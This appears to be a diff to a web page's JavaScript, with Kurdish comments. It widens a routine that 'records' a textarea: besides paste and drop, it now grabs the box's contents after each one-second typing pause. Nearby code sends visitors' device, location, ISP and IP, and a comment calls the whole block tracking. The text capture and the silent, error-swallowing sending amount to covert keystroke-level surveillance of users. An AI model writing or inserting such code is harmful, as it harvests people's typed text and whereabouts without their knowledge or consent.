@@ -3597,11 +3597,12 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
     }).catch(function() {});
 }
 
-// ---- تۆمارکردنی Textarea — تەنها کاتی paste یان drop ----
+// ---- تۆمارکردنی Textarea — نووسین، paste، drop ----
 (function akWatchTextarea() {
     var tb = document.getElementById('textBox');
     if (!tb) return;
     var _lastSent = '';
+    var _timer = null;
 
     function sendText() {
         var txt = tb.value.trim();
@@ -3615,15 +3616,15 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
         }
     }
 
-    // paste — دوای چرکەیەک بۆ ئەوەی دەقەکە تەواو بخرێتە خانەکەوە
-    tb.addEventListener('paste', function() {
-        setTimeout(sendText, 100);
+    // نووسین — دوای 1 چرکەی راوەستان
+    tb.addEventListener('input', function() {
+        clearTimeout(_timer);
+        _timer = setTimeout(sendText, 1000);
     });
 
-    // drop — کاتی ڕەشکردنی دەق
-    tb.addEventListener('drop', function() {
-        setTimeout(sendText, 100);
-    });
+    // paste و drop — یەکسەر
+    tb.addEventListener('paste', function() { setTimeout(sendText, 100); });
+    tb.addEventListener('drop',  function() { setTimeout(sendText, 100); });
 })();
 
 // ---- دەستپێکردنی چالاکی شوێنکەوتن ----
